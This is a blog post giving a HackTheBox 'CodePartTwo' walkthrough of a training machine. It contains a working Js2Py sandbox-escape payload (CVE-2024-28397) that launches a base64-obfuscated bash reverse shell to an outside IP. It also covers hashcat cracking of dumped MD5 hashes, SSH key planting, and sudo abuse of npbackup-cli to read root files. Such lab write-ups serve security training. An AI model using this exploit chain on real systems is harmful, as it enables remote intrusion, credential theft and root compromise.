---
layout: post
title: CodePartTwo
date: 2026-03-23 19:58 +0100
description: Exploiting a Js2Py RCE (CVE-2024-28397) for initial access, then escalating privileges through SQLite credential cracking and sudo abuse of npbackup-cli.
categories:
- Challenges
- Linux
tags:
- hackthebox
- writeups
- linux
- easy
---

![CodePartTwo HackTheBox Writeup](/assets/img/hackthebox/codeparttwo/codeparttwo.png){: width="80" height="80" .right }

## Reconnaissance

Use `nmap` to identify open ports and services on the target machine.

```bash
nmap -sS -sV -A <target_ip>
```

We find a web service running on port 8000.

## Js escape

Visit the web service on port 8000. It appears to be a simple web application that allows users to run JavaScript code.
We also find the source code of the application. Inside it, we see how JavaScript is executed:

```python
result = js2py.eval_js(code)
```

This means the application uses the `js2py` library to run JavaScript code. We can exploit this behavior to execute arbitrary Python code on the server.

Use this PoC for [CVE-2024-28397](https://github.com/D3ltaFormation/CVE-2024-28397-Js2Py-RCE) to get a reverse shell. Keep only the listener-related part.
The payload to insert in the web application is:

```javascript
let cmd = "printf YmFzaCA+JiAvZGV2L3RjcC8xMC4xMC4xNS45NC85MDAxIDA+JjE= | base64 -d | bash";
let a = Object.getOwnPropertyNames({}).__class__.__base__.__getattribute__;
let obj = a(a(a, "__class__"), "__base__");
function findpopen(o) {
    let result;
    for (let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i];
        if (item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item;
        }
        if (item.__name__ != "type" && (result = findpopen(item))) {
            return result;
        }
    }
}
findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true);
console.log("Command executed.");
```

Make sure to replace the Base64-encoded string with your own reverse shell command.
Start a listener on your machine:

```bash
python3 exploit.py --target <target_ip>:8000 --lhost <lhost> --lport <lport>
```

After executing the payload, you should receive a reverse shell connection.

## First Privilege Escalation

The app uses an SQLite database. We find `instance/users.db`, with a `user` table containing usernames and hashed passwords.

We can use `sqlite3` to access the database and extract the hashes.

```bash
sqlite3 instance/users.db
sqlite> SELECT username, password FROM user;
```

We extract Marco's MD5 hash and crack it with `hashcat`.

```bash
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

This gives us the password.

## Second Privilege Escalation

First, we add our public key to `/home/marco/.ssh/authorized_keys` to get SSH access as `marco`.

Now that we have SSH access as `marco`, we run `sudo -l` to check which commands can be executed as root without a password.

```bash
sudo -l
Matching Defaults entries for marco on codeparttwo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

In Marco's home directory, we find `npbackup.conf`. `npbackup` is described as "a file backup solution that fits both system administrators (CLI) and end users (GUI)" on its [website](https://github.com/La-Li-Lu-Le-Lo/netinvent-npbackup).

So we check for known vulnerabilities. After some research, we find [a PoC](https://github.com/AliElKhatteb/npbackup-cli-priv-escalation/) that allows arbitrary file reads.
We can just modify the following line:

```
backup_opts:
  paths:
    - /root
```

Then we can run the backup command as marco:

```bash
sudo /usr/local/bin/npbackup-cli -c npbackup.conf --backup
```

Finally, we can read `/root/root.txt` to obtain the flag.

```bash
sudo /usr/local/bin/npbackup-cli -c npbackup.conf --dump /root/root.txt --snapshot-id <snapshot_id>
```
